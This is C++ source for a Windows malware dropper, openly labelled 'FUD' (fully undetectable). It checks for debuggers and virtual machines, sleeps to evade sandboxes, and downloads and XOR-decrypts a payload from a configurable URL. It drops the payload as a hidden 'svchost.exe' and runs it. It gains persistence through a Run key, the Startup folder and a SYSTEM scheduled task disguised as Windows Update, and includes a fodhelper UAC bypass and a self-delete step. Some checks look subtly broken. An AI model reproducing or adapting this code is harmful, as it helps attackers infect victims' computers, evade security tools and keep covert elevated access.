// main.cpp - Basic FUD Malware Dropper with Persistence
// Compile with: g++ -o dropper.exe main.cpp -lwininet -O2 -s -fvisibility=hidden
// Or use MSVC: cl /EHsc /Fe dropper.exe main.cpp /link advapi32.lib

#include <windows.h>
#include <wininet.h>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <thread>
#include <shlobj.h>
#include <aclapi.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// Anti-debug / Anti-VM checks (basic)
bool IsDebugged() {
    return IsDebuggerPresent() || (GetModuleHandleA("sbieDll.dll") != NULL) || 
           (GetModuleHandleA("dbghelp.dll") != NULL) || 
           (GetModuleHandleA("snxhk.dll") != NULL); // Sophos
}

bool IsVM() {
    // Basic VM detection
    char cpuID[13];
    __cpuid((int*)cpuID, 1);
    // Check for hypervisor bit
    if (cpuID[3] & (1 << 31)) return true;
    
    // Check for common VM strings
    char vendor[13] = {0};
    __cpuid((int*)vendor, 0);
    std::string vendorStr(vendor);
    if (vendorStr.find("VMware") != std::string::npos ||
        vendorStr.find("VBox") != std::string::npos ||
        vendorStr.find("Virtual") != std::string::npos ||
        vendorStr.find("KVM") != std::string::npos ||
        vendorStr.find("Xen") != std::string::npos) {
        return true;
    }
    return false;
}

// XOR encryption/decryption for basic FUD
void XORCrypt(std::vector<unsigned char>& data, const std::string& key) {
    for (size_t i = 0; i < data.size(); i++) {
        data[i] ^= key[i % key.size()];
    }
}

// Download file from URL
bool DownloadFile(const std::string& url, std::vector<unsigned char>& output) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;
    
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }
    
    char buffer[8192];
    DWORD bytesRead;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        output.insert(output.end(), buffer, buffer + bytesRead);
    }
    
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

// Drop file to disk
bool DropFile(const std::string& path, const std::vector<unsigned char>& data) {
    std::ofstream file(path, std::ios::binary);
    if (!file) return false;
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
    return true;
}

// Execute file with possible UAC bypass
bool ExecuteFile(const std::string& path, bool hide = true) {
    SHELLEXECUTEINFOA shExecInfo = {0};
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
    shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = "open";
    shExecInfo.lpFile = path.c_str();
    shExecInfo.lpParameters = NULL;
    shExecInfo.lpDirectory = NULL;
    shExecInfo.nShow = hide ? SW_HIDE : SW_SHOW;
    
    return ShellExecuteExA(&shExecInfo);
}

// UAC bypass via fodhelper (works on Win10/11)
bool UACBypassFodhelper(const std::string& executablePath) {
    HKEY hKey;
    const char* subKey = "Software\\Classes\\ms-settings\\shell\\open\\command";
    
    // Set the command
    if (RegCreateKeyExA(HKEY_CURRENT_USER, subKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "", 0, REG_SZ, (BYTE*)executablePath.c_str(), executablePath.size() + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1);
        RegCloseKey(hKey);
        
        // Execute fodhelper
        ShellExecuteA(NULL, "open", "fodhelper.exe", NULL, NULL, SW_HIDE);
        return true;
    }
    return false;
}

// Persistence via multiple methods
bool SetupPersistence(const std::string& executablePath) {
    bool success = false;
    
    // Method 1: Registry Run key
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::string keyName = "WindowsUpdate_" + std::to_string(GetCurrentProcessId());
        if (RegSetValueExA(hKey, keyName.c_str(), 0, REG_SZ, (BYTE*)executablePath.c_str(), executablePath.size() + 1) == ERROR_SUCCESS) {
            success = true;
        }
        RegCloseKey(hKey);
    }
    
    // Method 2: Startup folder
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath))) {
        std::string shortcutPath = std::string(startupPath) + "\\WindowsUpdate.lnk";
        // Create shortcut (simplified - would need IShellLink for proper shortcut)
        CopyFileA(executablePath.c_str(), shortcutPath.c_str(), FALSE);
        success = true;
    }
    
    // Method 3: Scheduled task (via schtasks)
    std::string taskCmd = "schtasks /create /tn \"WindowsUpdate\" /tr \"" + executablePath + "\" /sc ONLOGON /ru SYSTEM /f";
    WinExec(taskCmd.c_str(), SW_HIDE);
    
    return success;
}

// Main dropper logic
int main() {
    // Anti-analysis checks
    if (IsDebugged() || IsVM()) {
        // Sleep and exit to avoid detection
        Sleep(5000);
        return 0;
    }
    
    // Random sleep to evade sandbox
    std::mt19937 rng(std::chrono::steady_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<int> dist(3000, 8000);
    Sleep(dist(rng));
    
    // Configuration (encrypted)
    std::string payloadURL = "http://example.com/payload.exe"; // CHANGE THIS
    std::string xorKey = "MySecretKey123"; // CHANGE THIS
    
    // Download payload
    std::vector<unsigned char> encryptedPayload;
    if (!DownloadFile(payloadURL, encryptedPayload)) {
        // Fallback: embedded payload (for testing)
        // In real scenario, this would be encrypted
        MessageBoxA(NULL, "Download failed", "Error", MB_OK);
        return 1;
    }
    
    // Decrypt payload
    XORCrypt(encryptedPayload, xorKey);
    
    // Get temp path
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string droppedPath = std::string(tempPath) + "svchost.exe";
    
    // Drop payload
    if (!DropFile(droppedPath, encryptedPayload)) {
        return 1;
    }
    
    // Set hidden attribute
    SetFileAttributesA(droppedPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    // Execute payload
    ExecuteFile(droppedPath, true);
    
    // Setup persistence
    SetupPersistence(droppedPath);
    
    // Optional: UAC bypass for elevated access
    // UACBypassFodhelper(droppedPath);
    
    // Self-delete (optional)
    // char cmdLine[MAX_PATH];
    // sprintf(cmdLine, "cmd /c del /f /q \"%s\"", argv[0]);
    // WinExec(cmdLine, SW_HIDE);
    
    return 0;
}
